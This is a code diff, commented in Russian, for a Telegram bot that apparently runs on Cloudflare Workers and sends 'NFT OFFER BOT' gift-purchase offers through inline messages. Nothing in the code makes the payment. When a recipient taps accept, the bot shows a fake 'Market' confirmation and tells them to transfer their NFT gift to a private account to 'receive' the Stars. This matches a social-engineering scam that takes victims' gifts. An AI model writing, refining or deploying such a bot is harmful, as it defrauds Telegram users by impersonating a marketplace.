@@ -7,7 +7,6 @@ const ALLOWED_USERNAMES = ["nogannopervi"];
 
 export default {
   async fetch(request, env, ctx) {
-    // Проверка секретного токена (защита от спама)
     const secretHeader = request.headers.get("X-Telegram-Bot-Api-Secret-Token");
     if (secretHeader !== WEBHOOK_SECRET) {
       return new Response("Forbidden", { status: 403 });
@@ -31,7 +30,8 @@ export default {
         if (!isAdmin && !isAllowed) {
           text = `🔒 <b>Доступ закрыт.</b>\n\nОбратитесь к владельцу.\nВаш ID: <code>${userId}</code>`;
         } else {
-          text = `🎁 <b>NFT OFFER BOT</b> ||\n\n✅ <b>Пользователь · Gift</b>\n🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\nОткрой чат и напиши:\n<code>@GarisOfferBot t.me/nft/PlushPepe-2687 9000 stars</code>`;
+          // ТУТ ОБНОВЛЕННЫЙ ТЕКСТ С ТВОИМ ПРИМЕРОМ
+          text = `🎁 <b>NFT OFFER BOT</b> ||\n\n✅ <b>Пользователь · Gift</b>\n🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\nЧтобы отправить оффер, напишите:\n<code>@GarisOfferBot t.me/nft/LolPop-348029 450 stars</code>`;
         }
         await callApi("sendMessage", { chat_id: chatId, text: text, parse_mode: "HTML" });
       }
@@ -49,19 +49,29 @@ export default {
 
         const textQuery = iq.query.trim();
         
-        // ИСПРАВЛЕНИЕ БАГА: Ищем все числа и берем ПОСЛЕДНЕЕ (это и есть сумма)
+        // Ищем все числа и берем последнее (это сумма)
         const allNums = textQuery.match(/\d+/g); 
         const amount = allNums ? allNums[allNums.length - 1] : "0"; 
         
         // Ищем название подарка
         const giftMatch = textQuery.match(/(?:t\.me\/nft\/)?[A-Za-z0-9_-]+/); 
-        const giftId = giftMatch ? giftMatch[0] : "Подарок";
+        const giftId = giftMatch ? giftMatch[0] : "";
+        
+        // Формируем правильную ссылку для красивой картинки
+        let giftLink = "";
+        if (giftId) {
+            if (giftId.startsWith("t.me")) {
+                giftLink = "https://" + giftId;
+            } else {
+                giftLink = "https://t.me/nft/" + giftId;
+            }
+        }
 
         let senderName = iq.from.first_name || "";
         if (iq.from.last_name) senderName += " " + iq.from.last_name;
         if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
 
-        const text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ⭐ Stars за этот подарок.\n\n⏳ Предложение действительно 5 ч. 59 мин.`;
+        const text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ⭐ Stars за этот подарок.\n\n${giftLink}\n\n⏳ Предложение действительно 5 ч. 59 мин.`;
 
         const results = [{
           type: "article",
@@ -83,25 +93,37 @@ export default {
       // --- КНОПКИ ---
       if (update.callback_query) {
         const cq = update.callback_query;
-        const chatId = cq.message.chat.id;
-        const messageId = cq.message.message_id;
-        const hasCaption = !!cq.message.caption;
-        const messageText = cq.message.text || cq.message.caption || "";
+        
+        // 1. СНАЧАЛА МГНОВЕННО ОТВЕЧАЕМ TELEGRAM (убираем загрузку)
+        try {
+          if (cq.data.startsWith("acc")) {
+            await callApi("answerCallbackQuery", { 
+              callback_query_id: cq.id, 
+              text: `Market\nПредложение на продажу успешно принято.`, 
+              show_alert: true 
+            });
+          } else if (cq.data.startsWith("dec")) {
+            await callApi("answerCallbackQuery", { callback_query_id: cq.id });
+          } else {
+            await callApi("answerCallbackQuery", { callback_query_id: cq.id });
+          }
+        } catch (e) {
+          console.error("Ошибка при ответе на кнопку:", e);
+        }
 
-        // Вытаскиваем сумму прямо из текста офера для красивого вывода
-        const amountMatch = messageText.match(/(\d+)\s*⭐/);
-        const amount = amountMatch ? amountMatch[1] : "указанную сумму";
+        // 2. ТЕПЕРЬ МЕНЯЕМ СООБЩЕНИЕ
+        try {
+          if (!cq.message) return new Response("OK", { status: 200 });
+          
+          const chatId = cq.message.chat.id;
+          const messageId = cq.message.message_id;
+          const hasCaption = !!cq.message.caption;
+          const messageText = cq.message.text || cq.message.caption || "";
 
-        if (cq.data === "acc") {
-          // 1. Мгновенно убираем загрузку и показываем Alert
-          await callApi("answerCallbackQuery", { 
-            callback_query_id: cq.id, 
-            text: `Market\nПредложение на продажу успешно принято.\n\nПередайте подарок покупателю, чтобы получить ${amount} ⭐`, 
-            show_alert: true 
-          });
+          const amountMatch = messageText.match(/(\d+)\s*⭐/);
+          const amount = amountMatch ? amountMatch[1] : "указанную сумму";
 
-          // 2. Меняем сообщение
-          try {
+          if (cq.data.startsWith("acc")) {
             const newText = `✓ <b>Предложение успешно принято.</b>\n\nПередайте подарок покупателю, чтобы получить ${amount} ⭐.`;
             const newMarkup = { 
               inline_keyboard: [[{ text: "Передать NFT ↗", url: "https://t.me/gwrex" }]] 
@@ -112,14 +134,8 @@ export default {
             } else {
               await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: newMarkup });
             }
-          } catch (e) { console.error(e); }
-        } 
-        else if (cq.data === "dec") {
-          // 1. Убираем загрузку
-          await callApi("answerCallbackQuery", { callback_query_id: cq.id });
-
-          // 2. Меняем сообщение
-          try {
+          } 
+          else if (cq.data.startsWith("dec")) {
             const newText = `× Оффер отклонён.`;
             const emptyMarkup = { inline_keyboard: [] };
 
@@ -128,7 +144,9 @@ export default {
             } else {
               await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: emptyMarkup });
             }
-          } catch (e) { console.error(e); }
+          }
+        } catch (e) {
+          console.error("Ошибка при изменении сообщения:", e);
         }
       }
 
